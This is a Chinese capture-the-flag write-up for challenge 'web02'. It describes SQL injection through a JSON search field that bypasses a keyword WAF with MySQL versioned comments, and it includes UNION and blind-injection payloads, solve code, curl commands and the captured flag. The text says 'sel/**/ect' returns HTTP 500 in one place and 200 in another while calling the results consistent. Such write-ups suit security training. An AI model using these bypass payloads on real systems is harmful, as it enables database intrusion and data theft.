# round3_1700/web02 · AI WAF 语义防护下的 SQL 注入（MySQL 版本注释绕过）

| 项 | 值 |
|----|-----|
| 轮次 | 环节三（17:00） |
| 平台题目名 | web02 |
| 比赛 qid | `yahqei40sgs2n_bk` |
| 分类 | web |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | `flag{1930275d-5db2-4cd0-adf2-e950621afc2d}` |
| 是否解出 | **已解出**（2026-09-14 17:19:26 平台提交 `code=0 message=恭喜您，回答正确`） |
| **还原完整度** | **B**（无原始附件、无源码泄露；按实测响应逐字节重建源码与 WAF，容器可跑、可复现整条利用链） |

## 1. 题面（比赛原文，逐字保留）

> 某科技公司的智能数据分析平台，凭借自主研发的大数据智能分析与研判引擎，打造了坚不可摧的全维度安全防护体系。其官网部署的AI WAF防护机制，能精准识别并阻断各类攻击请求。常规SQL注入payload会被直接拦截，但防护并非绝对不可突破，仍存在绕过与利用空间。

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | **无附件，纯容器题**（`file_url` 为空） |
| 容器 | `https://eci-2ze8p67inla1hiyvsvtk.cloudeci1.ichunqiu.com:5000`（**会随重置变化**；轮换后为 `eci-2ze8dun1ygtu20mhsk9m`） |
| 附件存放 | `attachments/.gitkeep`（占位，本题无附件） |
| 本地复现入口 | `http://127.0.0.1:8092`（`deploy/docker-compose.yml`，宿主端口 8092） |

## 3. 考点（★核心）

- **考点 1 — SQL 注入（字符串拼接上下文）**：`POST /search`，`Content-Type: application/json`，body `{"query":"<payload>"}`。`query` 被直接拼进 `LIKE '%...%'` 字符串上下文（`WHERE title LIKE '%<q>%' OR content LIKE '%<q>%' LIMIT 1`），未用预编译。判据：单个 `'` 直接导致 HTTP **500**（Flask/werkzeug 的 `Internal Server Error` 页），说明后端既没有转义也没有任何二次过滤。
- **考点 2 — AI WAF 语义拦截的可观测指纹**：命中拦截时返回 **HTTP 403** + `{"redirect_url":"/alert?confidence=0.98","status":"injection"}`，`confidence` 在 **0.63~1.00** 之间浮动（不同 payload 得分不同，实测 `and true` → 0.98，`union 5col` → 1.00）。拦截关键词集合（实测）：`or` `and` `union` `select` `from dual` `database()` `@@version` `limit` `ascii`。首页 `/alert` 是一个「AI WAF 已拦截」的落地页。**放行**：`'`、`||`、`xor`、`/**/`。
- **考点 3 — ★核心绕过：MySQL 可执行版本注释 `/*!NNNNN ... */`**。WAF 的匹配逻辑是**先把版本注释连同其内容整体剥掉，再在剩余文本里做关键字匹配**，于是 `/*!50000select*/`、`/*!50000union*/`、`/*!50000from*/`、`/*!50000limit*/` 全部穿透；反过来，普通块注释拆词 `sel/**/ect` 因为不是版本注释**不会**被剥掉，去掉空白后仍是 `sel/**/ect`（不含 `select`）→ 放行 → 到 MySQL 那里是语法错 500。这一「穿透 / 不穿透」的不对称是本题的判定点，也是重建时**绝对不能实现错**的地方（见 `deploy/src/waf.py` 的 `_VERSION_COMMENT` / `inspect()`）。
- **考点 4 — 布尔盲注 oracle（备用）**：`zzz' || (/*!50000select*/ (COND) /*!50000from*/ information_schema.tables /*!50000limit*/ 0,1)#` → 条件真则 `count=10`（article 表 10 行），假则 `count=0`。`||` 被 WAF 放行（`or` 被拦，但 `||` 是 MySQL 的等价逻辑或），这是「关键词黑名单 vs 语法等价替换」的经典逃逸。
- **考点 5 — UNION 注入与列回显定位**：`zzz' /*!50000union*/ /*!50000select*/ 1,2,3#` 三列可用（`article(id,title,content)`）；**第 3 列 `content` 是回显位**（第 1、2 列分别落进 `id`/`title`，响应 JSON 里可见）。最终 payload：
  `zzz' /*!50000union*/ /*!50000select*/ 1,2,(/*!50000select*/ flag /*!50000from*/ idap.flag)#`
- **考点 6 — 频率限制的真实副作用**：连发请求会返回 **HTTP 429** + `{"message":"操作过于频繁，请稍后再试","status":"error"}`。这不是 WAF 拦截，是独立的限流层；把它当成"被拦了"会误判绕过失败。dump 脚本必须对 429 做退避重试。
- **考点 7 — `load_file` 被环境掐死**：`@@secure_file_priv` 为 **NULL**（MySQL 8 默认 `--secure-file-priv=NULL` 表示完全禁止文件读写），所以 `load_file('/flag')` 这条路走不通，必须走库内数据（`idap.flag` 表）。这一条决定了「UNION dump」而非「读文件」是唯一正解。

## 4. 设计思路（★核心，站在出题人角度）

- **为什么这样出 —— 把「WAF 绕过」做成一道有唯一判定点的题**：题面直接点明「常规SQL注入payload会被直接拦截，但防护并非绝对不可突破」，这是给选手的**方向性提示**：不要去找旁站、不要去找上传点，突破口就在 WAF 本身。出题人刻意让 WAF 呈现为一个**可观测、可枚举**的黑盒（403 + `confidence` 数值 + 固定 JSON 结构），使得「逐条 payload 试探 → 归纳出拦截词表 → 再找词表的盲区」成为一条**可自动化**的路径。这非常适合 AI 智能体：探测是重复劳动，归纳是模式识别。
- **难度卡点设计在哪 —— 不对称性，而不是"更强的黑名单"**：这是本题最精妙的地方。出题人没有做一套"很大很全"的黑名单（那样只会变成耐力赛），而是做了一个**语义上不一致**的实现：WAF 认为"注释里的东西不是 SQL"，MySQL 认为"版本注释里的东西就是 SQL"。更关键的是**必须让 `sel/**/ect` 失败**——如果 WAF 也做「去注释再匹配」，那么选手用 `sel/**/ect` 就能过（因为去注释正好还原了 `select`），反而**更简单**；或者如果 WAF 连普通注释也整体剥掉，`sel/**/ect` 会被还原成 `select` 而被拦。只有「**剥版本注释、但保留普通注释的文本**」这一种实现会同时满足：`/*!50000select*/` 穿透 **且** `sel/**/ect` 掉进 500。选手必须**同时观察到这两个现象**才能反推出 WAF 的真实实现，从而确信自己走对了路（而不是碰巧绕过了）。
- **难度卡点设计在哪（2）—— 从"能过 WAF"到"能出数据"要跨两关**：穿透 WAF 只解决了第一关。第二关是**回显位**：UNION 必须列数对、必须把子查询塞进会回显的那一列。实测过程中 `order by 5` / 5 列 union 等都直奔 403 或超时，真正可用的是 3 列第 3 位。出题人在 article 表里塞了 10 行正文（都是正常的技术资讯），让"`'-- -` 命中 10 条"这个现象看起来像正常搜索，不额外泄露结构信息。
- **干扰项 / 诱导项**：
  1. **`'` 放行 + 500**：第一个"甜头"其实是个陷阱——它证明注入存在，但不给你任何数据，容易让人一头扎进**布尔盲注**（慢一个数量级）。正解是尽快转向 UNION。
  2. **`||` 放行**：诱导走 `' || 1#` 这类逻辑或，但它只做布尔判断，dump 效率极低。
  3. **`/**/` 放行**：诱导走"注释拆词"路线（`sel/**/ect`），这条路**不通**（500）。必须踩过这个坑、并把它与版本注释的成功做对比，才能理解 WAF 的实现。
  4. **429「操作过于频繁」**：最容易误判的干扰项——它长得像"被 WAF 拦了"，其实是限流。把它当成绕过失败会让人**放弃已经正确的 payload**。dump 脚本必须区分 403（WAF 语义拦截）与 429（限流退避）。
  5. **`database()` / `@@version` / `from dual` 被拦**：诱导选手以为"库名/版本都拿不到，没法枚举"，实际上用 `information_schema` 的 normal 写法 + `from` 被注释包裹即可枚举，库名 `idap` 也可以从 `schemata` 得到。
  6. **`secure_file_priv=NULL`**：堵死了"直接 `load_file('/flag')`"这条所有人第一反应会走的路，逼迫选手真的去打库里的 `flag` 表。
- **哪些地方是"必须踩坑才会发现"的**：
  - 不实测 `sel/**/ect` → 不会知道 WAF 是"剥版本注释"而不是"去注释"；
  - 不实测 429 → 会把限流误读成拦截；
  - 不实测 3 列 UNION → 会以为"union 被彻底拦死"（因为 5 列返回 403，那是列数不匹配导致的 SQL 语法错误恰好被语义评分判成注入，或相反）；
  - 不去读前端 JS → 不知道注入点是 `POST /search` 的 JSON body（首页只有一个搜索框，参数名 `query` 藏在 `/static/*.js` 里）。
- **对 AI 智能体参赛的针对性**：本题的设计非常适合"会写脚本、会做差分实验、但不一定能一眼看穿语义差异"的智能体。真正的分水岭是**是否会把"两个矛盾现象（版本注释过、普通拆词不过）"当成一条线索去反推实现** —— 只会穷举 payload 列表的智能体会在 `/**/` 那一步反复空转。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：`GET /` 拿到「智能数据分析平台」首页 + 前端 JS。JS 里有 `fetch('/search', {method:'POST', body: JSON.stringify({query: keyword})})` → **注入点 = `POST /search` 的 JSON 字段 `query`**。同时拿到 `/alert` 页与 `confidence` 阈值提示。
2. **打点**：`POST /search {"query":"hello"}` → `{"count":0,...,"status":"success"}`（正常）。`{"query":"'"}` → **HTTP 500** → 存在注入、无转义。
3. **枚举 WAF 边界**（`solve/solve.py` 的 `step1_filter_map`）：

   | payload | 结果 | 结论 |
   |---|---|---|
   | `hello` | 200 `count=0` | 基线 |
   | `'` | **500** | 无过滤 |
   | `or 1=1` / `and 1=1` | **403** `confidence=0.98` | `or`/`and` 拦 |
   | `union select 1,2,3` | **403** | `union`/`select` 拦 |
   | `' || 1#` | 200 | `\|\|` 放行 |
   | `xor 1` | 200 | `xor` 放行 |
   | `sel/**/ect` | **500** | 拆词**不被还原** |
   | `/*!50000select*/ 1` | **200** | **版本注释穿透** ★ |
   | `limit 0,1` / `ascii(...)` | 403 | `limit`/`ascii` 拦 |
   | `database()` / `@@version` / `from dual` | 403 | 拦 |

4. **布尔 oracle 确认**（`step2_boolean`）：
   ```
   zzz' || (/*!50000select*/ (1=1) /*!50000from*/ information_schema.tables /*!50000limit*/ 0,1)#   → count=10
   zzz' || (/*!50000select*/ (1=2) /*!50000from*/ information_schema.tables /*!50000limit*/ 0,1)#   → count=0
   ```
5. **确定列数与回显位**（`step3_union`）：`zzz' /*!50000union*/ /*!50000select*/ 1,2,3#` → 200，3 列；第 3 列回显。
6. **枚举**（`step4_enum`）：
   ```
   zzz' /*!50000union*/ /*!50000select*/ 1,2,(/*!50000select*/ group_concat(schema_name) /*!50000from*/ information_schema.schemata)#
   zzz' /*!50000union*/ /*!50000select*/ 1,2,(/*!50000select*/ @@secure_file_priv)#   → NULL（load_file 不通）
   → 库 `idap`；表 `article(id,title,content)`、`flag(flag)`
   ```
7. **取 flag**（`step5_flag`）：
   ```
   zzz' /*!50000union*/ /*!50000select*/ 1,2,(/*!50000select*/ flag /*!50000from*/ idap.flag)#
   → {"count":1,"results":[{"id":1,"title":"2","content":"flag{1930275d-5db2-4cd0-adf2-e950621afc2d}"}],...}
   ```
8. **提交**：`agent submit yahqei40sgs2n_bk 'flag{1930275d-5db2-4cd0-adf2-e950621afc2d}'` → `code=0 message=恭喜您，回答正确`，17:19:26。

## 6. 参考解法（代码）

完整脚本：`solve/solve.py`（参数化 `--target`，对 403/429/5xx 分别处理）。

```python
# 核心三行
pl = "zzz' /*!50000union*/ /*!50000select*/ 1,2,(%s)#" % sub          # UNION 3 列，第 3 列回显
sub = "/*!50000select*/ flag /*!50000from*/ idap.flag"
r = s.post(target + '/search', json={'query': pl})                    # {"count":1,"results":[{... "content":"flag{...}"}]}
```

布尔 oracle（备用路径）：

```python
pl = ("zzz' || (/*!50000select*/ (%s) /*!50000from*/ information_schema.tables "
      "/*!50000limit*/ 0,1)#" % cond)   # cond 真 → count=10，假 → count=0
```

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | `flag{1930275d-5db2-4cd0-adf2-e950621afc2d}` |
| 提交接口返回 | `{"qid":"yahqei40sgs2n_bk","flag":"flag{1930275d-5db2-4cd0-adf2-e950621afc2d}","code":0,"message":"恭喜您，回答正确","pass":true}` |
| 提交时间 | 2026-09-14 17:19:26 |
| 证据文件 | `work\submit_results_live.json` 第 18 条；flag 落盘 `work\flags\yahqei40sgs2n_bk.txt` |
| 原始采集脚本 | `work\r3_web02\probe1.py`~`probe9.py`、`work\r3_web02_dump.py`、`work\r3_web02_flag.py` |

## 8. 还原说明（诚实写）

- **已有原始件**：无附件、无源码。仅有**行为证据**：`work\r3_web02\probe1.txt`~`probe3.txt`（WAF 边界全表，UTF-16LE）、`work\r3_web02\js_out.txt`（前端 JS 原文 27KB，UTF-16LE）、`work\r3_web02_dump.py` / `work\r3_web02_flag.py`（实际 dump 脚本）、`work\flags\yahqei40sgs2n_bk.txt`（真 flag）。
- **重建部分**（`deploy/`，全部为**重建**，非原始源码）：
  - `deploy/src/app.py` — Flask 后端：`/`（首页）、`/alert`（AI WAF 拦截页）、`/search`（**故意使用字符串拼接**）、`/healthz`。首页与前端 JS 按 `js_out.txt` 里观察到的结构重写（搜索框 + `fetch('/search')` + `403 → location.href = redirect_url` + `article.title/article.content` 渲染 + `count===0` 空态 + `firework` 字段），响应字段名/类型与实测 JSON **逐字段对齐**（`count`/`firework`/`keyword`/`results[{id,title,content}]`/`status`）。
  - `deploy/src/waf.py` — **WAF 行为的忠实实现**（本题的核心）：`_VERSION_COMMENT = re.compile(r'/\*!\d{0,6}.*?\*/', re.S)` 先剥版本注释，再压空白后做关键字边界匹配；`sel/**/ect` 保留普通注释文本因而不被还原；`confidence` 按命中规则长度折算到 0.62~1.00；403 body 结构与 `redirect_url` 参数一致；另有独立的 429 限流层。
  - `deploy/mysql/init.sql` — 建 `idap` 库、`article(id,title,content)` 10 行、`flag(id,flag)` 1 行；`--secure-file-priv=NULL` 在 compose 的 mysql `command` 里显式指定（对齐实测）。
  - `deploy/Dockerfile` + `deploy/docker-compose.yml` — python:3.11-slim + mysql:8.0，宿主端口 8092，`FLAG` 环境变量注入，`app.py` 启动时把 `FLAG` 同步进 `idap.flag`。
- **未能还原**：
  - **原始源码与原始前端 JS 的逐字节内容**（比赛期间只抓到 `js_out.txt` 这份 dump，其中中文注释因当时编码处理丢失了部分可读性；重建版是按结构重写）。
  - **原 WAF 的真实判定算法**（题面宣称是"AI WAF"，实测表现出的是规则/语义混合；重建版用规则实现复现了**全部可观测行为**，但内部算法不等价）。
  - **原始前端 `/static/*.js` 的烟花特效脚本**（`myfirework.js`）：重建版只保留了 `firework` 响应字段，未重写 8.9KB 的 canvas 特效。
- **可复现性验证**（**已实测**，`docker compose up -d --build` 后跑出，原始输出见下）：`python solve/solve.py --target http://127.0.0.1:8092` → **退出码 0**，`[+] FLAG = flag{1930275d-5db2-4cd0-adf2-e950621afc2d}`（compose 里 `FLAG` 的值）。
  ```text
  [*] target = http://127.0.0.1:8092
      GET /        200  title=智能数据分析平台
      POST /search 200  {"count":0,"firework":0,"keyword":"hello","results":[],"status":"success"}

  === [1] WAF 边界探测（哪些被拦、哪些放行）===
      'hello'                        200    PASS count=0   # benign
      "'"                            500    PASS→SQL 语法错 (无 filtering)
      'or 1=1'                       403    WAF-BLOCK
      'and 1=1'                      403    WAF-BLOCK
      'union select 1,2,3'           403    WAF-BLOCK
      "' || 1#"                      200    PASS count=10
      'xor 1'                        200    PASS count=0
      'sel/**/ect'                   200    PASS count=0        ← 普通拆词不被还原（关键）
      '/*!50000select*/ 1'           200    PASS count=0        ← 版本注释穿透（关键）
      'limit 0,1'                    403    WAF-BLOCK
      'ascii(substr(1,1,1))'         403    WAF-BLOCK
      'database()'                   403    WAF-BLOCK
      '@@version'                    403    WAF-BLOCK
      'from dual'                    403    WAF-BLOCK

  === [2] 布尔 oracle（版本注释穿透）===
      (1=1) -> count>0 ? True
      (1=2) -> count>0 ? False
      [+] oracle 可用

  === [3] 确定 UNION 列数 ===
      1 列 -> 500 ; 2 列 -> 500
      3 列 -> 200 count=1 {"content": "3", "id": 1, "title": "2"}     ← 3 列可用，第 3 列回显
      4 列 -> 500 ; 5 列 -> 500

  === [4] 库/表枚举（information_schema）===
      current_user     idap@%
      version          8.0.46
      secure_file_priv NULL                                          ← load_file 不通
      schemata         information_schema,performance_schema,idap
      idap tables      article,flag
      idap columns     article:id,article:title,article:content,flag:id,flag:flag

  === [5] 取 flag：idap.flag.flag ===
      /*!50000select*/ flag /*!50000from*/ idap.flag
        -> flag{1930275d-5db2-4cd0-adf2-e950621afc2d}

  [+] FLAG = flag{1930275d-5db2-4cd0-adf2-e950621afc2d}
  ```
  > ★ 上表的 403/500/200 三态与比赛期间线上实测的 `probe3.txt` / `probe8.py` / `probe9.py` 结果**逐条一致**：
  > `or`/`and`/`union`/`limit`/`ascii`/`database()`/`@@version`/`from dual` 全拦；
  > `'` 放行到 500；`sel/**/ect` 放行（不还原）而 `/*!50000select*/` 穿透；
  > 3 列 UNION 可用且第 3 列回显；`@@secure_file_priv` 为 NULL。**这是本还原最关键的正确性证据：WAF 的"剥版本注释、
  > 不剥普通注释"这一不对称行为被忠实复现了。**
- **诚实标注**：本题**已解出**，flag 为平台验证过的真值，**无任何推测成分**。§4 中关于"出题人为什么这样设计"的部分是**基于实测行为的推断**（出题人未提供设计文档），已在文中明确以"设计思路/推断"表述；§3 的每一条考点都有对应的实测证据文件与上表的本地复现输出。

## 9. 复现步骤

```bash
cd timu/round3_1700/web02/deploy
docker compose up -d --build            # web → http://127.0.0.1:8092 ; mysql 内部服务
# 等 mysql healthy（约 20~60s，首次拉镜像更久）

cd ..
python solve/solve.py --target http://127.0.0.1:8092
#   预期：step1 打印 WAF 边界表（403/500/200 三态）
#         step2 oracle 可用
#         step3 3 列可用
#         step4 idap 库表结构
#         step5 [+] FLAG = flag{1930275d-5db2-4cd0-adf2-e950621afc2d}   ← compose 里 FLAG 的值

# 换 flag（模拟"每容器运行时注入"）：
#   改 docker-compose.yml 里 web.environment.FLAG，再 docker compose up -d web
# 复现比赛期间的 429 限流：
#   docker compose run -e WAF_RATE_LIMIT=8 ...  或改 compose 里 WAF_RATE_LIMIT 后重启 web

# 收尾
docker compose down -v
```

最小手工验证（不跑脚本）：

```bash
# 1) 单引号 → 500（证无过滤）
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://127.0.0.1:8092/search \
     -H 'Content-Type: application/json' -d '{"query":"'\''"}'
# 2) 经典 union → 403（证 WAF 拦）
curl -s -X POST http://127.0.0.1:8092/search -H 'Content-Type: application/json' \
     -d '{"query":"union select 1,2,3"}'
# 3) 版本注释 → 200 + flag（证绕过）
curl -s -X POST http://127.0.0.1:8092/search -H 'Content-Type: application/json' \
     -d '{"query":"zzz'\'' /*!50000union*/ /*!50000select*/ 1,2,(/*!50000select*/ flag /*!50000from*/ idap.flag)#"}'
```
